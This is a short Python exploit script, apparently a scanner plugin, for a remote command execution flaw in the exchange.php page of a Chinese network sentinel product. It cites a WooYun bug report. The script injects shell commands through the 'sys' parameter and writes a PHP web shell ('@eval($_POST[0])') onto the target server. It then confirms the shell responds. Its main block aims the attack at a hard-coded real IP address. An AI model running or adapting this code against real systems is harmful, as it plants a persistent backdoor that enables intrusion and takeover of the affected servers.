#!/usr/bin/env python
# -*- coding: utf-8 -*
#中科新业网络哨兵系统exchange.php远程命令执行漏洞
#http://www.wooyun.org/bugs/wooyun-2015-0110528
import random
import urllib

def assign(service, arg):
    if service == 'seentech_uccenter':
        return True, arg
        
def audit(arg):
    url = arg
    randnum = random.randint(666, 6666)
    cmd = "echo {data} | base64 -d > {filename}".format(
            data="<?php print(md5('1'));@eval($_POST[0]);?>".encode("base64").strip(),
            filename="testvul"+str(randnum)+".php",
        )
    cmd = urllib.quote(cmd)
    exp_url =url + "manage/admin/exchange.php?sys=whoami;{cmd};".format(cmd=cmd)
    vef_url = url + "manage/admin/testvul{num}.php".format(num=randnum)
    headers = {'Content-Type' : 'application/x-www-form-urlencoded'}
    code1,_,res1,_,_ = curl.curl2(exp_url)
    code2,_,res2,_,_ = curl.curl2(vef_url)
    if code2 ==200 and 'c4ca4238a0b923820dcc509a6f75849b' in res2:
        security_hole(vef_url)
   

if __name__ == '__main__':
    from dummy import *
    audit(assign('seentech_uccenter','http://219.134.131.240/')[1])